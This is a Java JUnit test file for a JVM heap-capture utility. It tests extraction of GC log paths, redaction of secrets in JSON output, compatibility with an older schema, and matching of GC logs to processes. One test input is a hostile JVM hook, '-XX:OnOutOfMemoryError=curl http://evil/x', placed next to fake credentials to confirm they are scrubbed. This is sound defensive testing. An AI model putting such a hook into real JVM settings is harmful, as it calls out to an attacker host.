package com.heapdump.analyzer.util;

import com.heapdump.analyzer.util.JvmHeapCapture.Candidate;
import com.heapdump.analyzer.util.JvmHeapCapture.Capture;
import com.heapdump.analyzer.util.JvmHeapCapture.Match;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * JVM 수집의 GC 로그 확장 (2026-09-14) — {@code -Xloggc}/{@code -Xlog} 경로 추출, allow-list 통과, 비밀값은 여전히 폐기,
 * GC 로그 전송 시 매칭({@code matchGcLog}) 3케이스, 구 스키마 JSON 호환.
 */
class JvmHeapCaptureGcLogTest {

    private static final long NOW = 1_800_000_000L;
    private static final long GB = 1L << 30;

    private static Candidate parse(String... argv) {
        List<String> a = new java.util.ArrayList<>();
        a.add("/opt/jdk/bin/java");
        a.addAll(List.of(argv));
        a.add("com.example.Main");
        return JvmHeapCapture.parseCommandLine(100, "app", NOW - 1000, "/opt/app", "/opt/jdk/bin/java", a, Map.of(), true, 16 * GB, false);
    }

    @Test
    @DisplayName("-Xloggc / -Xlog:…:file= / -Xlog:gc:<path> 에서 경로를 뽑고 옵션도 저장한다")
    void gcLogPathIsExtracted() {
        Candidate c = parse("-Xmx4g", "-Xloggc:/var/log/jvm/gc.log", "-XX:+PrintGCDetails", "-XX:+UseGCLogFileRotation", "-XX:NumberOfGCLogFiles=5", "-XX:GCLogFileSize=20M");
        assertEquals("/var/log/jvm/gc.log", c.gcLogPath());
        assertTrue(c.options().contains("-Xloggc:/var/log/jvm/gc.log"));
        assertTrue(c.options().contains("-XX:+PrintGCDetails"));
        assertTrue(c.options().contains("-XX:NumberOfGCLogFiles=5"));

        assertEquals("/opt/app/logs/gc-%t.log", parse("-Xlog:gc*:file=/opt/app/logs/gc-%t.log:time,uptime,level,tags:filecount=5,filesize=20m").gcLogPath());
        assertEquals("/tmp/gc.log", parse("-Xlog:gc:/tmp/gc.log").gcLogPath());
        assertEquals("/tmp/gc2.log", parse("-Xlog:gc*=info,safepoint:file=/tmp/gc2.log").gcLogPath());
        assertNull(parse("-Xlog:gc").gcLogPath(), "출력 지정 없음 → stdout");
        assertNull(parse("-Xlog:gc:stdout").gcLogPath());
        assertNull(parse("-Xlog:safepoint:file=/tmp/sp.log").gcLogPath(), "gc 셀렉터가 없으면 GC 로그가 아니다");
        assertNull(parse("-Xlog:disable").gcLogPath());
        assertEquals("/tmp/last.log", parse("-Xloggc:/tmp/first.log", "-Xlog:gc:file=/tmp/last.log").gcLogPath(), "마지막 지정이 이긴다");
    }

    @Test
    @DisplayName("GC 옵션을 허용해도 자격증명이 든 옵션은 여전히 JSON 어디에도 남지 않는다")
    void secretsStillDiscarded() {
        Candidate c = parse("-Xloggc:/var/log/gc.log", "-Ddb.password=Secr3t!", "-javaagent:/opt/agent.jar=licenseKey=ABCDEF", "-XX:OnOutOfMemoryError=curl http://evil/x");
        Capture cap = new Capture(JvmHeapCapture.SCHEMA, NOW, NOW, 16 * GB, 8 * GB, 200, false, null, List.of(c), null, null, List.of(), null);
        String json = JvmHeapCapture.toJson(cap);
        assertFalse(json.contains("Secr3t"));
        assertFalse(json.contains("licenseKey"));
        assertFalse(json.contains("evil"));
        assertTrue(json.contains("/var/log/gc.log"));
        assertEquals(2, c.otherOptionCount(), "-javaagent·OnOutOfMemoryError 는 개수만, -D 는 개수에도 안 잡힌다");
        Capture back = JvmHeapCapture.fromJson(json);
        assertNotNull(back);
        assertEquals("/var/log/gc.log", back.candidates().get(0).gcLogPath());
    }

    @Test
    @DisplayName("구 스키마(gcLogPath 없음) JSON 도 읽힌다 — 필드 null")
    void oldSchemaStillReadable() {
        String v1 = "{\"schema\":1,\"capturedAtEpoch\":1,\"remoteNowEpoch\":1,\"memTotal\":0,\"memAvailable\":0,\"procVisible\":1,\"truncated\":false,"
                + "\"candidates\":[{\"pid\":7,\"user\":\"u\",\"startEpoch\":1,\"mainClass\":\"M\",\"cwd\":\"/c\",\"exe\":\"/j\",\"xmsBytes\":1,\"xmxBytes\":2,\"xmxOrigin\":\"cmdline\","
                + "\"heapDumpPath\":null,\"options\":[],\"otherOptionCount\":0,\"markers\":{},\"envReadable\":true,\"envUsed\":false,\"argfile\":false,\"container\":false}],"
                + "\"matchedIndex\":0,\"matchReason\":\"single\",\"matchFlags\":[],\"note\":null}";
        Capture cap = JvmHeapCapture.fromJson(v1);
        assertNotNull(cap);
        assertNull(cap.candidates().get(0).gcLogPath());
        assertEquals(7, cap.matched().pid());
    }

    private static Candidate cand(int pid, String gcLogPath, String cwd) {
        return new Candidate(pid, "app", NOW - 1000, "M", cwd, "/j", GB, 2 * GB, "cmdline", null, gcLogPath, List.of(), 0, Map.of(), true, false, false, false);
    }

    private static Capture cap(Candidate... cs) {
        return new Capture(JvmHeapCapture.SCHEMA, NOW, NOW, 16 * GB, 8 * GB, 300, false, null, List.of(cs), null, null, List.of(), null);
    }

    @Test
    @DisplayName("matchGcLog: 경로 일치 1개 → gclog-path, 여럿 → ambiguous, 0개인데 java 1개 → single(약함), 그 외 미확정")
    void matchGcLogCases() {
        Match m = JvmHeapCapture.matchGcLog(cap(cand(1, "/var/log/a/gc.log", "/a"), cand(2, "/var/log/b/gc.log", "/b")), "/var/log/b/gc.log.2");
        assertEquals(1, m.index());
        assertEquals("gclog-path", m.reason());

        Match amb = JvmHeapCapture.matchGcLog(cap(cand(1, "/var/log/gc.log", "/a"), cand(2, "/var/log/gc.log", "/b")), "/var/log/gc.log");
        assertNull(amb.index());
        assertEquals("ambiguous", amb.reason());
        assertTrue(amb.flags().contains(JvmHeapCapture.FLAG_AMBIGUOUS_PID));

        Match single = JvmHeapCapture.matchGcLog(cap(cand(1, null, "/a")), "/var/log/gc.log");
        assertEquals(0, single.index());
        assertEquals("single", single.reason());

        Match none = JvmHeapCapture.matchGcLog(cap(cand(1, null, "/a"), cand(2, null, "/b")), "/var/log/gc.log");
        assertNull(none.index());
        assertEquals("no-candidates", JvmHeapCapture.matchGcLog(cap(), "/x").reason());

        Match rel = JvmHeapCapture.matchGcLog(cap(cand(1, "logs/gc.log", "/opt/app"), cand(2, "logs/gc.log", "/opt/other")), "/opt/app/logs/gc.log.0");
        assertEquals(0, rel.index(), "상대경로는 각자의 cwd 기준으로 절대화해 비교");
    }
}
